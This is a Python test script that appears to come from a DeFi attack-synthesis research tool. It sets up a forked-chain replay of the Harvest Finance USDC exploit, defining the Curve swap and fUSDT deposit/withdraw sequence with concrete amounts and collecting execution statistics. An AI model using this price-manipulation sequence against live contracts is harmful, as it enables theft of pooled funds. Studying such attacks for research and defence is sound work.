import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator


from SingleApprox.SingleApprox import single_round_approx, predict

from Utils import *


from Harvest_USDC import *

from src.forge.forgeCollect import *


if __name__ == '__main__':

    # config.method
    # config.contract_name
    # config.initialEther
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 0
    config.ETHorBSCorDVDorFantom = 0
    config.initialEther = 500000
    config.blockNum = 11129500
    config.contract_name = "Harvest_USDC_attack"


# Test for correct sequence of actions and correct sequence of parameters

# print("==========================================================================================================================")

    action1 = Curve_USDC2USDT()
    action2 = fUSDT_deposit()
    action3 = Curve_USDT2USDC()
    action4 = fUSDT_withdraw()
    action_list1 = [action1, action2, action3, action4]
    action_list2 = [action2, action3, action4, action1]

    ActionWrapper = Harvest_USDCAction

    paras1 = [10554172, 49972546, 10564726, 51543726]
    paras2 = [10554172, 49972546, 10564726, 51543725]

    # executeAndGetStats([action_list, action_list], ActionWrapper, [[paras1, paras2],[paras2, paras1]] )
    action_lists = [action_list1, action_list2]
    paras = [[paras1, paras2], [paras2, paras1]]
    data_map = executeAndGetStats(action_lists, paras, ActionWrapper)
    print(data_map)

    for action_list in action_lists:
        for ii in range(len(action_list)):
            pp = action_list[0: len(action_list) - ii]
            stats = data_map[ToString(pp)]
            checkAndAddDatapoints(pp, ActionWrapper, stats)
